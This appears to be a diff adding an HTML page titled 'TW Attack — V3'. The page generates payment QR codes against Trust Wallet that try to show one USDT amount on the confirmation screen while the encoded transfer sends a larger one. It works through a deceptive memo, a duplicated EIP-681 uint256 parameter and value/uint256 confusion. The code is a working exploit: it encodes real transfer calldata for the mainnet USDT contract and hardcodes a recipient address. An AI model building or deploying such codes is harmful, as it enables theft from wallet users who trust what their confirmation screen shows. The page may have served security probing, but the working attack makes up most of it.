@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TW Attack — V3: memo, duplicate uint256, value confusion</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 16px; max-width: 800px; margin: 0 auto; }
+    h1 { font-size: 20px; margin-bottom: 4px; color: #f0883e; }
+    .subtitle { font-size: 12px; color: #8b949e; margin-bottom: 16px; }
+    .test-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    .test-card h3 { font-size: 14px; color: #e6edf3; margin-bottom: 4px; }
+    .test-card .desc { font-size: 11px; color: #8b949e; margin-bottom: 8px; }
+    .test-card .theory { font-size: 11px; color: #c9d1d9; background: #0d1117; padding: 8px; border-radius: 6px; margin-bottom: 10px; border-left: 3px solid #f0883e; }
+    .test-card .theory code { background: #0d1117; padding: 1px 4px; border-radius: 3px; font-size: 10px; color: #7ee787; }
+    .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 9px; font-weight: 600; }
+    .badge-new { background: #58a6ff22; color: #58a6ff; border: 1px solid #58a6ff44; }
+    .qr-cell { text-align: center; background: #0d1117; padding: 12px; border-radius: 8px; border: 1px solid #21262d; margin-bottom: 10px; }
+    .qr-cell img { max-width: 220px; max-height: 220px; border-radius: 6px; background: white; padding: 6px; }
+    .qr-cell .uri-box { font-size: 9px; color: #8b949e; word-break: break-all; background: #0d1117; padding: 6px; border-radius: 4px; margin-top: 6px; max-height: 36px; overflow-y: auto; border: 1px solid #21262d; }
+    input, select { width: 100%; padding: 10px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: #e6edf3; font-size: 14px; font-family: monospace; margin-bottom: 8px; }
+    input:focus, select:focus { outline: none; border-color: #f0883e; }
+    label { display: block; font-size: 12px; color: #8b949e; margin-bottom: 3px; margin-top: 8px; }
+    .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; background: #f0883e; color: #0d1117; margin: 12px 0; }
+    .btn:hover { background: #f0a05e; }
+    .status { font-size: 12px; color: #8b949e; margin-top: 8px; }
+    .status.ok { color: #3fb950; }
+    .result-info { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 12px 0; }
+    .result-info div { background: #0d1117; padding: 8px 10px; border-radius: 6px; }
+    .result-info .label { font-size: 9px; color: #8b949e; text-transform: uppercase; }
+    .result-info .value { font-size: 15px; font-weight: 600; margin-top: 2px; }
+    .result-info .value.display { color: #f0883e; }
+    .result-info .value.execute { color: #ff6b6b; }
+    .built-with { text-align: center; font-size: 10px; color: #484f58; margin-top: 24px; }
+  </style>
+</head>
+<body>
+  <h1>🔬 V3 — 3 Final Angles</h1>
+  <p class="subtitle">Memo display • Duplicate uint256 • value vs uint256 confusion</p>
+
+  <div class="test-card">
+    <h3><span class="badge badge-new">TEST 1</span> memo parameter on trust:// (no amount)</h3>
+    <p class="desc">Does Trust Wallet show memo on the confirmation screen? If yes, "Payment: 1 USDT" with 0 ETH amount could deceive.</p>
+    <div class="theory">
+      <code>trust://send?asset=c60_t0xUSDT&address=RECIPIENT&data=<4USDT_calldata>&memo=Payment:%201%20USDT</code><br>
+      Known: data passes through when amount is absent ✅<br>
+      Unknown: does memo show on confirmation screen?
+    </div>
+    <div class="qr-cell">
+      <img id="qr1" src="" alt="QR" loading="lazy">
+      <div class="uri-box" id="uri1">—</div>
+    </div>
+  </div>
+
+  <div class="test-card">
+    <h3><span class="badge badge-new">TEST 2</span> EIP-681 — Duplicate uint256</h3>
+    <p class="desc">URL standard: parsers return last value for duplicate keys. If TW reads first for display, last for execution → mismatch.</p>
+    <div class="theory">
+      <code>ethereum:0xUSDT@1/transfer?address=RECIPIENT&uint256=1000000&uint256=4000000</code><br>
+      Display reads uint256 first=1M (1 USDT)<br>
+      Execution reads uint256 last=4M (4 USDT)?
+    </div>
+    <div class="qr-cell">
+      <img id="qr2" src="" alt="QR" loading="lazy">
+      <div class="uri-box" id="uri2">—</div>
+    </div>
+  </div>
+
+  <div class="test-card">
+    <h3><span class="badge badge-new">TEST 3</span> EIP-681 — value vs uint256 confusion</h3>
+    <p class="desc">EIP-681 defines <code>value</code> for native ETH. If TW confuses value with token amount for execution but uses uint256 for display...</p>
+    <div class="theory">
+      <code>ethereum:0xUSDT@1/transfer?address=RECIPIENT&uint256=1000000&value=4000000</code><br>
+      Display: uint256=1M → 1 USDT<br>
+      Execution: value=4M → 4 USDT built into calldata?
+    </div>
+    <div class="qr-cell">
+      <img id="qr3" src="" alt="QR" loading="lazy">
+      <div class="uri-box" id="uri3">—</div>
+    </div>
+  </div>
+
+  <label>Recipient Address</label>
+  <input type="text" id="recipient" value="0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a">
+  <label>Display Amount (shown in wallet)</label>
+  <input type="number" id="displayAmt" value="1" min="0" step="0.01">
+  <label>Execute Amount (data encodes this)</label>
+  <input type="number" id="executeAmt" value="4" min="0" step="0.01">
+
+  <button class="btn" id="genBtn">🔗 Generate Test QR Codes</button>
+
+  <div style="display:none" id="resultInfo">
+    <div class="result-info">
+      <div><div class="label">📱 Wallet Shows</div><div class="value display" id="displayVal">—</div></div>
+      <div><div class="label">⚡ Should Execute</div><div class="value execute" id="executeVal">—</div></div>
+    </div>
+  </div>
+
+  <div class="status" id="statusMsg">Set addresses and click generate</div>
+
+  <p class="built-with">Test 1 checks memo visibility on screen. Tests 2-3 check EIP-681 parameter parsing order/confusion.</p>
+
+  <script>
+    (function() {
+      function padHex(val, bytes) {
+        return val.toString(16).toLowerCase().padStart(bytes * 2, '0');
+      }
+
+      function encodeTransfer(recipientRaw, amountHuman, decimals) {
+        const r = recipientRaw.replace('0x', '').toLowerCase();
+        const amt = BigInt(Math.round(amountHuman * Math.pow(10, decimals)));
+        return '0xa9059cbb' + r.padStart(64, '0') + padHex(amt, 32);
+      }
+
+      function assetId(token) {
+        return 'c60_t0x' + token.replace('0x', '').toLowerCase();
+      }
+
+      const TOKEN = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+      const DECIMALS = 6;
+
+      function generate() {
+        const recipient = document.getElementById('recipient').value.trim();
+        const displayAmt = parseFloat(document.getElementById('displayAmt').value) || 1;
+        const executeAmt = parseFloat(document.getElementById('executeAmt').value) || 4;
+
+        if (!/^0x[a-fA-F0-9]{40}$/.test(recipient)) {
+          document.getElementById('statusMsg').textContent = '❌ Invalid recipient address';
+          document.getElementById('statusMsg').style.color = '#ff6b6b';
+          return;
+        }
+
+        const displayUnits = Math.round(displayAmt * Math.pow(10, DECIMALS));
+        const executeUnits = Math.round(executeAmt * Math.pow(10, DECIMALS));
+        const calldata = encodeTransfer(recipient, executeAmt, DECIMALS);
+        const asset = assetId(TOKEN);
+
+        // TEST 1: trust:// + memo (no amount)
+        const uri1 = 'trust://send?asset=' + asset + '&address=' + recipient + '&data=' + calldata + '&memo=Payment:%201%20USDT';
+        document.getElementById('qr1').src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(uri1);
+        document.getElementById('uri1').textContent = uri1;
+
+        // TEST 2: EIP-681 duplicate uint256
+        const uri2 = 'ethereum:' + TOKEN + '@1/transfer?address=' + recipient + '&uint256=' + displayUnits + '&uint256=' + executeUnits;
+        document.getElementById('qr2').src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(uri2);
+        document.getElementById('uri2').textContent = uri2;
+
+        // TEST 3: EIP-681 value vs uint256
+        const uri3 = 'ethereum:' + TOKEN + '@1/transfer?address=' + recipient + '&uint256=' + displayUnits + '&value=' + executeUnits;
+        document.getElementById('qr3').src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(uri3);
+        document.getElementById('uri3').textContent = uri3;
+
+        document.getElementById('displayVal').textContent = displayAmt + ' USDT';
+        document.getElementById('executeVal').textContent = executeAmt + ' USDT';
+        document.getElementById('resultInfo').style.display = 'block';
+        document.getElementById('statusMsg').textContent = '✅ 3 QR codes generated. Scan each and report what confirmation screen shows.';
+        document.getElementById('statusMsg').style.color = '#3fb950';
+      }
+
+      document.getElementById('genBtn').addEventListener('click', generate);
+      document.querySelectorAll('input').forEach(el => {
+        el.addEventListener('keydown', function(e) { if (e.key === 'Enter') generate(); });
+      });
+
+      // Auto-generate on load
+      setTimeout(generate, 100);
+    })();
+  </script>
+</body>
+</html>
